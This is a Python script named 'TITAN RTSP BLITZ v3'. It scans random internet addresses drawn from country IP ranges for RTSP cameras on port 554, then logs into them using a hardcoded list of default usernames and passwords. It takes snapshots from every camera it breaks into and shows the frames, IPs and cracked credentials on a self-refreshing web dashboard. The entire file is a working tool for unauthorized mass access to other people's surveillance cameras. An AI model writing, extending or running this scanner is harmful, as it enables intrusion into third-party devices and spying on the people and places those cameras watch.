#!/usr/bin/env python3
"""
TITAN RTSP BLITZ v3 — Find 100 live RTSP streams.
Mega-scale: 100K IPs/round, async everything, native RTSP Digest auth.
Skip frame grabs until found — speed is everything.
"""

import asyncio
import base64
import hashlib
import ipaddress
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "blitz_frames"
RESULTS = BASE / "results"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS

# ── Top paths (order matters — highest hit rate first) ──
PATHS = [
    "/Streaming/Channels/101",  # Hikvision
    "/cam/realmonitor?channel=1&subtype=0",  # Dahua
    "/",  # Generic/XMeye
    "/live",
    "/stream1",
    "/h264/ch1/main/av_stream",
    "/0",
    "/1",
    "/onvif1",
    "/live.sdp",
    "/Streaming/Channels/102",
    "/cam/realmonitor?channel=1&subtype=1",
    "/axis-media/media.amp",
    "/videoMain",
    "/stream",
]

# ── Top creds ──
CREDS = [
    ("admin", ""),
    ("admin", "12345"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "1234"),
    ("root", ""),
    ("root", "pass"),
    ("root", "root"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "Admin123"),
]

# ── Globals ──
LIVE = []  # validated live streams
LOCK = threading.Lock()
TARGET = 100
STATS = {"ips": 0, "rtsp": 0, "probed": 0, "valid": 0, "frames": 0,
         "round": 0, "status": "init", "t0": None}
DASH = BASE / "blitz_stream.html"


def gen_ips(cidrs, n):
    nets = [ipaddress.ip_network(c, strict=False) for c in cidrs if '/' in c]
    ws = [net.num_addresses for net in nets]
    out = set()
    while len(out) < n:
        net = random.choices(nets, weights=ws, k=1)[0]
        if net.num_addresses > 2:
            ip = str(net.network_address + random.randint(1, net.num_addresses - 2))
            if not ip.endswith((".0", ".255")):
                out.add(ip)
    return list(out)


# ═══════════════════════════════════════════════════════
# PHASE 1: Mass async OPTIONS scan
# ═══════════════════════════════════════════════════════

async def options_check(ip, sem):
    async with sem:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), 0.8)
            w.write(f"OPTIONS rtsp://{ip}:554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(512), 1.0)
            w.close()
            resp = data.decode(errors="ignore")
            if "RTSP" in resp:
                return ip
        except Exception:
            pass
    return None


async def find_rtsp(ips):
    sem = asyncio.Semaphore(4000)
    tasks = [options_check(ip, sem) for ip in ips]
    results = await asyncio.gather(*tasks)
    return [ip for ip in results if ip]


# ═══════════════════════════════════════════════════════
# PHASE 2: Async DESCRIBE + Digest auth
# ═══════════════════════════════════════════════════════

def _digest(user, pwd, realm, nonce, uri):
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"DESCRIBE:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


async def describe_auth(ip, path, user, pwd, sem, found_ips):
    """Single DESCRIBE attempt with Digest auth. Returns cam dict or None."""
    if ip in found_ips:
        return None
    async with sem:
        if ip in found_ips:
            return None
        url = f"rtsp://{ip}:554{path}"
        req = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\nUser-Agent: LibVLC/3.0.18\r\n\r\n"
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, 554), 1.2)
            w.write(req.encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(2048), 1.5)
            resp = data.decode(errors="ignore")

            # Direct 200 — no auth needed
            if "RTSP/1.0 200" in resp:
                w.close()
                found_ips.add(ip)
                return {"ip": ip, "port": 554, "rtsp_url": url,
                        "user": "", "password": "", "path": path,
                        "auth": "none", "ts": datetime.now().isoformat()}

            # 401 with Digest challenge
            if "401" in resp and user:
                rm = re.search(r'realm="([^"]*)"', resp)
                nm = re.search(r'nonce="([^"]*)"', resp)
                if rm and nm:
                    realm, nonce = rm.group(1), nm.group(1)
                    dig = _digest(user, pwd, realm, nonce, url)
                    auth_req = (
                        f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 3\r\n"
                        f"Accept: application/sdp\r\nUser-Agent: LibVLC/3.0.18\r\n"
                        f'Authorization: Digest username="{user}", realm="{realm}", '
                        f'nonce="{nonce}", uri="{url}", response="{dig}"\r\n\r\n'
                    )
                    w.write(auth_req.encode())
                    await w.drain()
                    data2 = await asyncio.wait_for(r.read(4096), 1.5)
                    resp2 = data2.decode(errors="ignore")
                    if "RTSP/1.0 200" in resp2:
                        w.close()
                        found_ips.add(ip)
                        auth_url = f"rtsp://{user}:{pwd}@{ip}:554{path}"
                        return {"ip": ip, "port": 554, "rtsp_url": auth_url,
                                "user": user, "password": pwd, "path": path,
                                "auth": "digest", "ts": datetime.now().isoformat()}
            w.close()
        except Exception:
            pass
    return None


async def probe_all(rtsp_ips):
    """Flat parallel probe: all IPs × paths × creds simultaneously."""
    sem = asyncio.Semaphore(500)
    found_ips = set()
    tasks = []

    for ip in rtsp_ips:
        # First: try top 5 paths without auth (fast check for open cameras)
        for path in PATHS[:5]:
            tasks.append(describe_auth(ip, path, "", "", sem, found_ips))
        # Then: top 5 paths × top 8 creds with auth
        for path in PATHS[:5]:
            for user, pwd in CREDS[:8]:
                tasks.append(describe_auth(ip, path, user, pwd, sem, found_ips))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if r and isinstance(r, dict)]


# ═══════════════════════════════════════════════════════
# FRAME GRAB (threaded, called after finding streams)
# ═══════════════════════════════════════════════════════

def grab_frame(cam):
    safe = cam["ip"].replace(".", "_")
    fpath = str(FRAMES / f"cam_{safe}.jpg")
    try:
        r = subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-stimeout", "4000000",
             "-i", cam["rtsp_url"], "-vframes", "1", "-vf", "scale=640:-1",
             "-f", "image2", fpath],
            capture_output=True, timeout=8, text=True)
        if r.returncode == 0 and os.path.isfile(fpath) and os.path.getsize(fpath) > 2000:
            cam["frame_file"] = fpath
            with open(fpath, "rb") as f:
                cam["frame_b64"] = base64.b64encode(f.read()).decode()
            res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
            cam["resolution"] = f"{res.group(1)}x{res.group(2)}" if res else "?"
            return True
    except Exception:
        pass
    cam["frame_b64"] = ""
    cam["resolution"] = "?"
    return False


def grab_frames_batch(cams):
    """Grab frames for a batch of cameras in parallel threads."""
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=10) as pool:
        list(pool.map(grab_frame, cams))


# ═══════════════════════════════════════════════════════
# MAIN HUNT
# ═══════════════════════════════════════════════════════

def hunt(all_cidrs, batch=100000):
    STATS["status"] = "hunting"
    STATS["t0"] = time.time()

    while len(LIVE) < TARGET:
        STATS["round"] += 1
        rnd = STATS["round"]
        ips = gen_ips(all_cidrs, batch)
        STATS["ips"] += len(ips)

        elapsed = time.time() - STATS["t0"]
        print(f"\n[R{rnd:>3}] {len(ips):,} IPs | found={len(LIVE)}/{TARGET} | {elapsed:.0f}s elapsed")

        # Phase 1: OPTIONS
        t1 = time.time()
        loop = asyncio.new_event_loop()
        rtsp_hosts = loop.run_until_complete(find_rtsp(ips))
        loop.close()
        STATS["rtsp"] += len(rtsp_hosts)
        print(f"  OPTIONS: {len(rtsp_hosts)} RTSP hosts ({time.time()-t1:.1f}s)")

        if not rtsp_hosts:
            continue

        # Phase 2: DESCRIBE + Digest
        t2 = time.time()
        STATS["probed"] += len(rtsp_hosts)
        loop2 = asyncio.new_event_loop()
        valid_cams = loop2.run_until_complete(probe_all(rtsp_hosts))
        loop2.close()
        print(f"  DESCRIBE: {len(valid_cams)} valid from {len(rtsp_hosts)} hosts ({time.time()-t2:.1f}s)")

        if valid_cams:
            # Grab frames in background
            new_cams = []
            for cam in valid_cams:
                if len(LIVE) >= TARGET:
                    break
                STATS["valid"] += 1
                with LOCK:
                    LIVE.append(cam)
                new_cams.append(cam)
                auth_tag = f"{cam['user']}:{cam['password']}" if cam['user'] else "open"
                print(f"  ✅ #{len(LIVE):>3}  {cam['ip']:>15}  [{auth_tag}]  {cam['path']}")

            # Grab frames for new cams
            grab_frames_batch(new_cams)
            STATS["frames"] += sum(1 for c in new_cams if c.get("frame_b64"))

        save_results()
        regen_dashboard()

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    elapsed = time.time() - STATS["t0"]
    print(f"\n{'='*70}")
    print(f"  DONE — {len(LIVE)} live RTSP streams found in {elapsed:.0f}s")
    print(f"{'='*70}")


# ═══════════════════════════════════════════════════════
# DASHBOARD + RESULTS
# ═══════════════════════════════════════════════════════

def regen_dashboard():
    ts = datetime.now().strftime('%H:%M:%S')
    elapsed = time.time() - (STATS["t0"] or time.time())
    rate = len(LIVE) / max(elapsed / 60, 0.01)
    pct = min(100, len(LIVE))

    cards = ""
    for i, c in enumerate(LIVE):
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:4px;">' if b64 else '<div style="height:100px;background:#181828;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#444;font-size:10px;">Grabbing frame...</div>'
        auth = f'{c["user"]}:{c["password"]}' if c.get("user") else "OPEN"
        cards += f'''<div style="background:#12122a;border:1px solid #2a2a4a;border-radius:6px;padding:8px;margin:4px;width:260px;">
<div style="color:#0f0;font-weight:bold;font-size:12px;">#{i+1} {c["ip"]}</div>{img}
<div style="font-size:10px;color:#888;margin-top:3px;">Path: <code style="color:#0ff;">{c.get("path","?")}</code> Res: {c.get("resolution","?")} Auth: {auth}</div>
<div style="font-size:8px;color:#555;word-break:break-all;">{c.get("rtsp_url","")}</div></div>'''

    html = f'''<!DOCTYPE html><html><head><meta charset="utf-8"><title>RTSP BLITZ</title>
<meta http-equiv="refresh" content="8">
<style>body{{background:#0a0a15;color:#eee;font-family:monospace;margin:0;padding:15px}}code{{background:#000;padding:1px 3px;border-radius:2px}}.s{{display:inline-block;background:#111;padding:5px 10px;border-radius:4px;margin:2px;border:1px solid #222;font-size:12px}}.s b{{color:#0f0}}</style></head>
<body><h1 style="color:#f00;margin:0 0 8px;">⚡ TITAN RTSP BLITZ v3</h1>
<div><span class="s">Status: <b>{STATS["status"]}</b></span>
<span class="s">IPs: <b>{STATS["ips"]:,}</b></span>
<span class="s">RTSP: <b>{STATS["rtsp"]}</b></span>
<span class="s">Probed: <b>{STATS["probed"]}</b></span>
<span class="s" style="border-color:#0f0">Streams: <b style="font-size:15px">{len(LIVE)}/{TARGET}</b></span>
<span class="s">Rate: <b>{rate:.1f}/min</b></span>
<span class="s">R{STATS["round"]}</span>
<span class="s">{elapsed:.0f}s</span>
<span class="s">{ts}</span></div>
<div style="width:100%;background:#111;border-radius:6px;height:18px;margin:8px 0;overflow:hidden">
<div style="background:linear-gradient(90deg,#0f0,#0ff);height:100%;width:{pct}%;border-radius:6px;text-align:center;font-size:10px;font-weight:bold;color:#000;line-height:18px">{pct}%</div></div>
<div style="display:flex;flex-wrap:wrap">{cards}</div></body></html>'''
    DASH.write_text(html)


def save_results():
    with open(RESULTS / "rtsp_blitz_live.json", "w") as f:
        json.dump({"ts": datetime.now().isoformat(), "stats": STATS,
                    "streams": [{k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password", "path", "resolution", "auth"]} for c in LIVE]},
                   f, indent=2, default=str)


# ═══════════════════════════════════════════════════════
# HTTP
# ═══════════════════════════════════════════════════════

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200); self.send_header("Content-Type", "application/json"); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
            self.wfile.write(json.dumps({"stats": STATS, "found": len(LIVE)}, default=str).encode())
        elif DASH.exists():
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
            self.wfile.write(DASH.read_bytes())
        else:
            self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0'><h1>Starting...</h1></body></html>")
    def log_message(self, *a): pass


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7702)
    p.add_argument("--batch", type=int, default=100000)
    args = p.parse_args()
    TARGET = args.target

    all_cidrs = [c for country in GLOBAL_CIDRS.values() for c in country]
    print(f"[INIT] {len(all_cidrs)} CIDRs, {len(GLOBAL_CIDRS)} countries")

    regen_dashboard()
    threading.Thread(target=lambda: HTTPServer(('0.0.0.0', args.port), H).serve_forever(), daemon=True).start()

    print(f"\n{'='*70}")
    print(f"  ⚡ TITAN RTSP BLITZ v3 — Target: {TARGET}")
    print(f"  {args.batch:,} IPs/round | http://localhost:{args.port}")
    print(f"{'='*70}\n")

    try:
        hunt(all_cidrs, batch=args.batch)
    except KeyboardInterrupt:
        print(f"\nStopped — {len(LIVE)} streams")
    finally:
        save_results(); regen_dashboard()
        print(f"Results: {RESULTS/'rtsp_blitz_live.json'}  Dashboard: {DASH}")
